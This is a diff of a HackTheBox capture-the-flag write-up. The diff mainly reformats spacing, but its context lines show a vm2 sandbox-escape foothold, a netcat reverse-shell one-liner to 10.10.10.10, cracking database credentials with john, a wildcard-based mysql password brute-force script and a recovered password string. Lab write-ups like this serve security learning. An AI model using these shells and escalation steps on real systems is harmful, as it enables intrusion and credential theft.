@@ -18,15 +18,13 @@ HackTheBox: Medium
 ## 1: Enumeration
 
 - nmap scanning
-
- 
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled_1.png' | relative_url }})
-
+<br/><br/>
 FOOTHOLD
-
+<br/><br/>
 ```bash
 const {VM} = require("vm2");
 const vm = new VM();
@@ -56,30 +54,30 @@ console.log(vm.run(code));
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
 ```
-
+<br/><br/>
 ## 2: User flag
-
+<br/><br/>
 Route
-
+<br/><br/>
 ```bash
 /var/www/contact 
 ```
-
+<br/><br/>
 There is a db creds
-
+<br/><br/>
 We use john for get user flag (joshua)
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled_2.png' | relative_url }})
-
+<br/><br/>
 ## 3: Priv esc
-
+<br/><br/>
 > There is a mistake (bad practice) with mysql. Sometimes bash uses the admin password as a “args” and not as a string so we can use a script and with the help of * we can make:
-> 
+<br/><br/>
 
 ![Untitled]({{ '/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled_3.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled_4.png' | relative_url }})
-
+<br/><br/>
 ```bash
 import string
 import subproccess
@@ -102,8 +100,11 @@ while not is_password_found:
 	else:
 		is_password_found = True
 ```
-
+<br/><br/>
 klj12h3jhaskjh12kjh3
-
+<br/><br/>
 Machine pwned!
 <script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
+
+
+<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
